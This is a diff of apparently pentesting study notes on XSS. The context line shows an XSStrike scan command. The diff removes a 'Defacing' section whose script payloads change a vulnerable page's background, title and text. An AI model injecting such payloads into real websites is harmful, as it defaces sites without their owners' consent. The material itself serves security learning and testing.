@@ -65,40 +65,4 @@ And then we just run the tool:
 python xsstrike.py -u "http://www.example.com:PORT/index.php?menu=test" 
 ```
 
-### Defacing
-
-After we successfully discover a XSS vulnerability, we might want exploit it and inject JavaScript code through XSS and make a web page look any way we like.
-
-There are some common HTML elements usually utilized to change the original look of a web page:
-
-* Background Color <mark style="color:purple;">document.body.style.background</mark>
-* Background <mark style="color:purple;">document.body.background</mark>
-* Page Title <mark style="color:purple;">document.title</mark>
-* Page Text <mark style="color:purple;">DOM.innerHTML</mark>
-
-#### Changing the Background
-
-```html
-<script>document.body.style.background = "black"</script>
-```
-
-{% code overflow="wrap" %}
-```html
-<script>document.body.background = "https://www.example.com/images/logo.svg"</script>
-```
-{% endcode %}
-
-#### Changing Page Title
-
-```html
-<script>document.title = 'Example Site'</script>
-```
-
-#### Changing Page Text
-
-It is possible to change the text of a specific HTML element/DOM using <mark style="color:purple;">innerHTML</mark> function:
-
-```javascript
-document.getElementById("todo").innerHTML = "New Text"
-```
-
+###
